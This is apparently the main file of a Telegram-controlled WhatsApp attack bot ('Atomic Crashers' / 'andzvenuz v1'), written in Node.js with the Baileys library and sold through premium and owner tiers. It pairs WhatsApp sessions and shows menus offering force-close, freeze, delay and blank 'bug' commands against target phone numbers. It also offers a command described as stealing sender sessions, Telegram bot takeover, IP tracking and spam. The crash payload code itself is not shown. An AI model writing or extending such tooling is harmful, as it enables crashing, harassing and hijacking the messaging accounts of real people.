
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require("@bellachu/baileys");

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const ONLY_FILE = path.join(__dirname, "gruponly.json");
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/ridoarizzzz/curut/refs/heads/main/token.json"; 
const cd = path.join(__dirname, "cd.json");

///==== (Random Image) =====\\\
function getRandomImage() {
const images = [
"https://files.catbox.moe/yi1upc.jpg", 
"https://files.catbox.moe/yi1upc.jpg",
];
  return images[Math.floor(Math.random() * images.length)];
}
// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.length) {
    console.log(chalk.blue(`
❌ TOKEN TIDAK ADA DI DATABASE
    `));
    process.exit(1);
  }

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.blue("❌ TOKEN TIDAK VALID"));
    process.exit(1);
  }

  console.log(chalk.blue("✅ Token valid"));
  startBot();
}

function startBot() {
  console.log(chalk.blue(`⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @pacenicwlee
☇ Name Script : Atomic Crashers 
☇ Version : 16.00
  
Bot Berhasil Terhubung Gunakan Script Sebrutal Mungkin`));
}

validateToken()

function startBot() {
  console.log(chalk.red(`
⣽⣿⢣⣿⡟⣽⣿⣿⠃⣲⣿⣿⣸⣷⡻⡇⣿⣿⢇⣿⣿⣿⣏⣎⣸⣦⣠⡞⣾⢧⣿⣿
⣿⡏⣿⡿⢰⣿⣿⡏⣼⣿⣿⡏⠙⣿⣿⣤⡿⣿⢸⣿⣿⢟⡞⣰⣿⣿⡟⣹⢯⣿⣿⣿
⡿⢹⣿⠇⣿⣿⣿⣸⣿⣿⣿⣿⣦⡈⠻⣿⣿⣮⣿⣿⣯⣏⣼⣿⠿⠏⣰⡅⢸⣿⣿⣿
⣼⣿⢰⣿⣿⣇⣿⣿⡿⠛⠛⠛⠛⠄⣘⣿⣿⣿⣿⣿⣿⣶⣿⠿⠛⢾⡇⢸⣿⣿⣿
⠄⣿⡟⢸⣿⣿⢻⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋⠉⣠⣴⣾⣿⡇⣸⣿⣿⡏
⠄⣿⡇⢸⣿⣿⢸⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠘⢿⣿⠏⠄⣿⣿⣿⣹
⠄⢻⡇⢸⣿⣿⠸⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣦⣼⠃⠄⢰⣿⣿⢯⣿
⠄⢸⣿⢸⣿⣿⡄⠙⢿⣿⣿⡿⠁⠄⠄⠄⠄⠉⣿⣿⣿⣿⣿⣿⡏⠄⢀⣾⣿⢯⣿⣿
⣾⣸⣿⠄⣿⣿⡇⠄⠄⠙⢿⣀⠄⠄⠄⠄⠄⣰⣿⣿⣿⣿⣿⠟⠄⠄⣼⡿⢫⣻⣿⣿
⣿⣿⣿⠄⢸⣿⣿⠄⠄⠄⠄⠙⠿⣷⣶⣤⣴⣿⠿⠿⠛⠉⠄⠄⢸⣿⣿⣿⣿⠃⠄⣴
`));
console.log(chalk.green(`
» 𝗜𝗡𝗙𝗢𝗧𝗠𝗔𝗧𝗜𝗢𝗡:
☇ developer : t.me/iselcungz
☇ Name Script : andzvenuz v1
☇ Version : 1.0 𝚟𝚒𝚙 𝚘𝚗𝚕𝚢

`));
}


// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
////=== Intalasi WhatsApp ===\\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
〣 Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
〣 Memproses Connecting
╰➤ Number : ${botNumber}
╰➤ Status : Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
〣 Connection closed.
╰➤ Number : ${botNumber}
╰➤ Status : Failed ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, delaycursed: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
〣 Connection Success!
╰➤ Number : ${botNumber}
╰➤ Status : Sukses Connect.
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber, "DEATFLWS");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
〣 Code Pairing Kamu
╰➤ Number : ${botNumber}
╰➤ Code : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
〣 Menyiapkan Kode Pairing
╰➤ Number : ${botNumber}
╰➤ Status : ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

///=== Function Cek id ch ===\\\
async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}
// --------------------- ( Bot Setting ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./Database/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./Database/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./Database/premium.json');
            ensureFileExists('./Database/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./Database/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./Database/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./Database/premium.json', (data) => (premiumUsers = data));
    watchFile('./Database/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
////==== Fungsi buat file otomatis ====\\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

if (!fs.existsSync(cd)) {
  fs.writeFileSync(cd, JSON.stringify({ time: 0, users: {} }, null, 2));
}
// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}
///===== ( Menu Utama ) =====\\\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Hayoloh Ngapain Harus Addprem Dulu kalo Mau Menu Muncul 」
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "MY CREATOR💞", url: "https://t.me/nanzlyora", style : "primary" },
          ]
        ]
      }
    });
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const caption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐒𝐂 𝐀𝐍𝐃𝐙𝐕𝐄𝐍𝐔𝐙 𝐕𝟏 
𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐋𝐀𝐇 𝐁𝐔𝐆 𝐃𝐄𝐍𝐆𝐀𝐍 𝐁𝐈𝐉𝐀𝐊 ✅
<blockquote>『 𝐀𝐍𝐃𝐙𝐕𝐄𝐍𝐔𝐙 𝐕𝟏 』</blockquote>
✧ 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : @iselcungz
✧ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎 𝐯𝐢𝐩 𝐨𝐧𝐥𝐲 
✧ 𝐦𝐲 𝐩𝐫𝐢𝐧𝐜𝐞𝐬 : 𝐀****
`;

  const buttons = [
  [
   { text: "SPICLES⚠️", callback_data: "nanzhama", style : "success" }
  ],
  [
   { text: "TOOLS V2💞", callback_data: "tools2menu", style : "success" }
   ],
   [
    { text: "SUPPORT💞", callback_data: "suppmenu", style : "success" },
    { text: "OWNER IN MENU💞", callback_data: "ownermenu", style : "danger" }
  ],
  [
    { text: "TOOLS💞", callback_data: "toolsmenu", style : "danger" },
    { text: "ATTACK💞", callback_data: "bugshow", style : "danger" }
  ],
  [   
    { text: "MY CREATOR💞", url: "https://t.me/iselcungz", style : "primary" },
    { text: "MY INFOTMATION💞", url: "https://t.me/deathflowersnew", style : "primary" }
  ]
];

  bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const randomImage = getRandomImage();
  const senderId = callbackQuery.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
  
  let newCaption = "";
  let newButtons = [];
  if (data === "bugshow") {
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
Holaa ${username}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote>『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗠𝗨𝗥𝗕𝗨𝗚 』</blockquote>
✧ Author : @nanzlyora
✧ Version : 12.0.0 Infinity
✧ Runtime : ${runtime}
<blockquote>【 BUG OPTIONS 】</blockquote>

〣 /Dfspam » 62xx
    ¿ DELAY INVIS X HARD BEBAS SPAM ?
    
〣 /Dfinvis » 62xx
     ¿ DELAY INVIS BEBAS SPAM ?
     
〣 /Dffc » 62xx
    ¿ FC BEBAS SPAM [ NOT WORK ALL DEVICE ] ?
    
〣 /Dffreze » 62xx   
    ¿ FREZE BEBAS SPAM ( NOT WORK ALL DEVICE ) ?
    
〣 /Dfhard » 62xx
    ¿ HARD DELAY BEBAS SPAM ?
    
〣 /Dfblank » 62xx
    ¿ BLANK BEBAS SPAM ? 

<blockquote>【 CONTROLS OPTIONS 】</blockquote>

〣 /delbug 628xx » Hapus Bug 
〣 /tes 628xx » Test Function Bug
〣 /csession » mencuri sender adp
`; 

     newButtons = [
      [{ text: "⬅️BACK", callback_data: "mainmenu", style : "primary" }],
      [{ text: "NEXT➡️", callback_data: "ownermenu", style : "success" }]
    ];
  } else if (data === "nanzhama") {
    const runtime = getBotRuntime();
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
Holaa ${username}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote>『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗠𝗨𝗥𝗕𝗨𝗚 』</blockquote>
✧ Author : @nanzlyora
✧ Version : 12.0.0 Infinity
✧ Runtime : ${runtime}
          『  𝗦𝗣𝗜𝗖𝗟𝗘𝗦 』
𝐃𝐀𝐋𝐀𝐌 𝐕𝐄𝐑𝐒𝐈 𝐈𝐍𝐈 𝐒𝐀𝐌𝐏𝐀𝐈 𝐕𝐄𝐑𝐒𝐈 𝟐𝟎.𝟎.𝟎 𝐃𝐄𝐀𝐓𝐇 𝐅𝐋𝐎𝐖𝐄𝐑𝐒 𝐌𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐓𝐇𝐄𝐌𝐀 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐀𝐓𝐀𝐔 𝐁𝐈𝐒𝐀 𝐃𝐈 𝐁𝐈𝐋𝐀𝐍𝐆 𝐌𝐎𝐃𝐄 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 𝐔𝐍𝐓𝐔𝐊 𝐌𝐔𝐑𝐁𝐔𝐆. 𝐉𝐈𝐊𝐀 𝐀𝐃𝐀 𝐊𝐄𝐋𝐔𝐇𝐀𝐍 𝐄𝐑𝐎𝐑 𝐀𝐓𝐀𝐔 𝐅𝐔𝐍𝐂 𝐀𝐌𝐏𝐀𝐒 𝐁𝐈𝐒𝐀 𝐇𝐔𝐁𝐔𝐍𝐆𝐈 𝐍𝐀𝐍𝐙 𝐘𝐀 𝐂𝐇𝐀𝐓
@nanzlyora TENGKYU.
C 2026-05-16
`;
    newButtons = [
      [{ text: "⬅️BACK", callback_data: "mainmenu", style : "danger" }],
      [{ text: "NEXT➡️", callback_data: "ownermenu", style : "primary" }]
    ];
  } else if (data === "ownermenu") {
    const runtime = getBotRuntime();
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
Holaa ${username}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote>『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗠𝗨𝗥𝗕𝗨𝗚 』</blockquote>
✧ Author : @nanzlyora
✧ Version : 12.0.0 Infinity
✧ Runtime : ${runtime}
<blockquote>【 OWNER OPTIONS 】</blockquote>
 —# Owner Access:  
〣 /update   » update sc
〣 /addadmin » add userid  
〣 /deladmin » del userid  
〣 /addprem » add userid  
〣 /delprem » del userid  
〣 /cekprem » check userid  
 —# OWNER  Access:  
〣 /status » check connected   
〣 /delsesi » del connected  
〣 /reqpair » connect number   
〣 /delpair » delete number 
〣 /setjeda » atur jeda bug  
〣 /grouponly » on & off  .
`;

    newButtons = [
      [{ text: "⬅️BACK", callback_data: "bugshow", style : "success" }],
      [{ text: "NEXT➡️", callback_data: "suppmenu", style : "success" }]
      
    ];
  } else if (data === "suppmenu") {
    const runtime = getBotRuntime();
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
Holaa ${username}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote>『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗠𝗨𝗥𝗕𝗨𝗚 』</blockquote>
✧ Author : @nanzlyora
✧ Version : 12.0.0 Infinity
✧ Runtime : ${runtime}
<blockquote>【 SUPPORTD OPTIONS 】</blockquote>
〣 @nanzlyora [ MY DEV  ]
〣 @ptandsupport [ SUPER BEST SUPPORT ]
〣 @allah [ My Tuhan ]
〣 All Buyer Death Flowers ( 💞 )
〣 @deathflowersnew [ Ch Info Wajib Follo ]
`;

    newButtons = [
      [{ text: "⬅️BACK", callback_data: "mainmenu", style : "primary" }],
      [{ text: "NEXT➡️", callback_data: "toolsmenu", style : "primary" }]
      
    ];
  } else if (data === "toolsmenu") {
    const runtime = getBotRuntime();
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
Holaa ${username}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote>『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗠𝗨𝗥𝗕𝗨𝗚 』</blockquote>
✧ Author : @nanzlyora
✧ Version : 12.0.0 Infinity
✧ Runtime : ${runtime}
<blockquote>【 TOOLS MENU 】</blockquote>
〣 /nfsw » anime okep
〣 /beritaindo » berita indo hari ini
〣 /tourl » mengubah media link  
〣 /iqc » membuat kata kata   
〣 /info » cek userid   
〣 /brat » membuat stiker
〣 /spam » spam teks kamu
〣 /allmember » daftar member on
〣 /play » play Spotify 
〣 /listharga » list harga script
〣 /trackip » check ip address  
〣 /done » done TRX you
〣 /rasukbot » rasuk bot telegram 
〣 /xn » vidio 18+ .
`;    

    newButtons = [
      [{ text: "⬅️BACK", callback_data: "bugshow", style : "danger" }],
      [{ text: "NEXT➡️", callback_data: "tools2menu", style : "danger" }]
      
    ];
  } else if (data === "tools2menu") {
    const runtime = getBotRuntime();
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
ʜᴏʟᴀ ${username} selamat menggunakan andzvenuz v1 core
<blockquote>『 𝘢𝘯𝘥𝘻𝘷𝘦𝘯𝘶𝘻 𝘷1 』</blockquote>
✧ Author :  @iselcungz
✧ Version : 1.0 ᴠɪᴘ ᴏɴʟʏ 
✧ Runtime : ${runtime}
